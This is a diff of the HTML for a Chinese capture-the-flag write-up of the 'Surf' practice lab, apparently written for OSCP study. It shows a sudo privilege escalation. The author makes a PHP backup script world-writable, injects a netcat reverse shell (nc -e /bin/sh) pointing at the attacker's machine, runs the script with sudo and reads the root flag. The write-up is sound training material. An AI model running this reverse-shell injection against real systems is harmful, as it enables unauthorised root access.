-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">james@Surf:~$ sudo -l
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看sudo权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">james@Surf:~$ sudo -l
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">We trust you have received the usual lecture from the <span class="nb">local</span> System
 </span></span><span class="line"><span class="cl">Administrator. It usually boils down to these three things:
@@ -411,13 +677,41 @@
 </span></span><span class="line"><span class="cl">james@Surf:~$ ls -al /var/backups/database-backup.php 
 </span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> www-data www-data <span class="m">2758</span> Nov  <span class="m">9</span>  <span class="m">2021</span> /var/backups/database-backup.php
 </span></span><span class="line"><span class="cl">james@Surf:~$ 
-</span></span></code></pre></div><p>有思路了，修改PHP文件，sudo执行反弹shell</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有思路了，修改PHP文件，sudo执行反弹shell</p>
 <p>切换2个用户太麻烦了，主要是nc的shell不方便修改文件，干脆直接修改权限为777</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@Surf:/var/backups$ chmod <span class="m">777</span> database-backup.php 
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@Surf:/var/backups$ chmod <span class="m">777</span> database-backup.php 
 </span></span><span class="line"><span class="cl">www-data@Surf:/var/backups$ ls -l database-backup.php 
 </span></span><span class="line"><span class="cl">-rwxrwxrwx <span class="m">1</span> www-data www-data <span class="m">2829</span> Dec  <span class="m">3</span> 06:07 database-backup.php
-</span></span></code></pre></div><p>试了下写在文件末尾不行，只能写在前面。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">james@Surf:~$ vi /var/backups/database-backup.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>试了下写在文件末尾不行，只能写在前面。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">james@Surf:~$ vi /var/backups/database-backup.php
 </span></span><span class="line"><span class="cl">james@Surf:~$ 
 </span></span><span class="line"><span class="cl">james@Surf:~$ head /var/backups/database-backup.php
 </span></span><span class="line"><span class="cl">&lt;?php
@@ -430,7 +724,23 @@
 </span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;nc 192.168.45.197 9000 -e /bin/sh&#34;</span><span class="o">)</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">james@Surf:~$ sudo /usr/bin/php /var/backups/database-backup.php
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">9000</span>
 </span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
 </span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.197<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.162.171<span class="o">]</span> <span class="m">33036</span>
@@ -440,7 +750,9 @@
 </span></span><span class="line"><span class="cl">proof.txt
 </span></span><span class="line"><span class="cl">cat /root/proof.txt
 </span></span><span class="line"><span class="cl">e58a15c56a6f26de90c3393c15f0bc20
-</span></span></code></pre></div><p><img loading="lazy" src="/resource/%e9%9d%b6%e6%9c%ba-PG_Surf_WriteUp/image-20231203191808916.png" srcset="/resource/%e9%9d%b6%e6%9c%ba-PG_Surf_WriteUp/image-20231203191808916.png, /resource/%e9%9d%b6%e6%9c%ba-PG_Surf_WriteUp/image-20231203191808916.png 1.5x, /resource/%e9%9d%b6%e6%9c%ba-PG_Surf_WriteUp/image-20231203191808916.png 2x" sizes="auto" data-title="image-20231203191808916" data-alt="image-20231203191808916" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p></div><div class="post-footer" id="post-footer">
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/resource/%e9%9d%b6%e6%9c%ba-PG_Surf_WriteUp/image-20231203191808916.png" srcset="/resource/%e9%9d%b6%e6%9c%ba-PG_Surf_WriteUp/image-20231203191808916.png, /resource/%e9%9d%b6%e6%9c%ba-PG_Surf_WriteUp/image-20231203191808916.png 1.5x, /resource/%e9%9d%b6%e6%9c%ba-PG_Surf_WriteUp/image-20231203191808916.png 2x" sizes="auto" data-title="image-20231203191808916" data-alt="image-20231203191808916" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
